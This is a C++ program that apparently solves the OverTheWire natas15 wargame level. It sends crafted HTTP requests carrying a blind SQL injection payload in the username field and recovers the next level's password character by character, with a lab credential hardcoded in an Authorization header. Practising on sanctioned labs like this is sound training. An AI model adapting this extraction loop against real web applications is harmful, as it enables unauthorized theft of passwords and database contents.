#include <iostream>
#include <string>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>


const std::string top_header = 
    "POST /index.php HTTP/1.1\r\n"
    "Host: natas15.natas.labs.overthewire.org\r\n"
    "Content-Length: ";

//need to insert content length between top_header and request_main

const std::string bottom_header ="\r\n"
    "Cache-Control: max-age=0\r\n"
    "Authorization: Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA==\r\n"
    "Accept-Language: en-US,en;q=0.9\r\n"
    "Origin: http://natas15.natas.labs.overthewire.org\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Upgrade-Insecure-Requests: 1\r\n"
    "User-Agent: Mozilla/5.0 (X11; Linux x86_64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36\r\n"
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,"
    "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
    "Referer: http://natas15.natas.labs.overthewire.org/\r\n"
    "Accept-Encoding: identity\r\n"
    "Connection: keep-alive\r\n"    
    "\r\n";                      

    
const std::string request_value_base =
    "username=natas16"
    "\" AND BINARY substring(password,1,";
    //raw string for gui testing:
    //username=natas16 " AND BINARY substring(password,1,1) = 'a' -- 

    const std::string host = "natas15.natas.labs.overthewire.org";
    constexpr int port = 80; 

typedef enum matchResult {
    NO_MATCH,
    MATCH,
    Connection_Error
} matchResult;

int createConnection();
void findPassword(int sock);
matchResult checkPW_Match(int sock, std::string& request_value);

int main() {
    FILE *fp = freopen("password_res.txt", "w", stdout);
    if (fp == NULL) {
        perror("freopen failed");
        return 1;
    }

    //Connect
    int sock;
    if ( (sock = createConnection()) < 0) {
        std::cout << "Failed to create connection. Exiting.\n";
        exit(1);
    }
    findPassword(sock);

}

int createConnection() {
    hostent* server = gethostbyname(host.c_str());
    if (!server) {
        std::cerr << "Host not found.\n";
        return -1;
    }

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }
    sockaddr_in serv_addr{};
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    std::memcpy(&serv_addr.sin_addr.s_addr, server->h_addr, server->h_length);

    struct timeval tv;
    tv.tv_sec  = 2;  // 2.5 s timeout
    tv.tv_usec = 500000; 

    if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0) {
        perror("setsockopt(SO_RCVTIMEO)");
    }
    if (connect(sock, (sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("connect");
        close(sock);
        return -1;
    }
    return sock;
}

//Construct password one character at a time
void findPassword(int sock) {
    std::string password= "";  
    while(password.length() < 64) { //password shouldn't be too long
        constexpr char endChar = 'z';
        for (char nextChar = '0'; nextChar <= endChar; nextChar++){
            if(!std::isalnum(nextChar)){
                continue;
            }

            std::string request_value = request_value_base + std::to_string(password.length() + 1) + ")"
                " = '" + password + nextChar + "' #";
            matchResult res = checkPW_Match(sock, request_value);

            if(res == MATCH){
                password += nextChar;
                std::cout << "Found so far: " << password << "\n";
                break;  //continue to next string position

            } else if (res == Connection_Error){
                std::cout << "Connection error occurred. Will attempt to reconnect.\n";
                close(sock);
                if ( (sock = createConnection()) < 0) {
                    std::cout << "Failed to create connection. Exiting.\n";
                    exit(1);
                }
                nextChar--; //try again with new connection
                continue;   

            } else if (res == NO_MATCH && nextChar == endChar){
                std::cout << "No more matching characters found. Password is: " << password << "\n";
                close(sock);
                exit(0);
            }
        }

    }
    std::cout<<"pw too long, something is wrong..\n";
    exit(1);
}

//send the request to natas15 and check response for match or no match.
matchResult checkPW_Match(int sock, std::string& request_value) {

    //Send request
    std::string full_request = top_header + std::to_string(request_value.length()) + bottom_header + request_value;
    ssize_t sent = send(sock, full_request.c_str(), full_request.length(), 0);
    if (sent < 0) {
        std::cout<<"send error\n";
        close(sock);
        return Connection_Error;
    }

    // Recv response
    char buffer[4096];
    std::string response={0};
    ssize_t bytes;
    while ((bytes = recv(sock, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[bytes] = '\0';
        response += buffer;
        if(response.find("This user exists") != std::string::npos) {
            std::cout << request_value << "exists!\n";

            return matchResult::MATCH;
        } else if (response.find("This user doesn't exist") != std::string::npos) {
            return matchResult::NO_MATCH;
        }
    }

    //We didn't find the match or no match text
    std::cout << "message timeout or invalid\n";
    std::cout<< "Full request was:\n" << full_request << "\n";
    std::cout << "Full response:\n" << response << "\n";
    return Connection_Error;
}
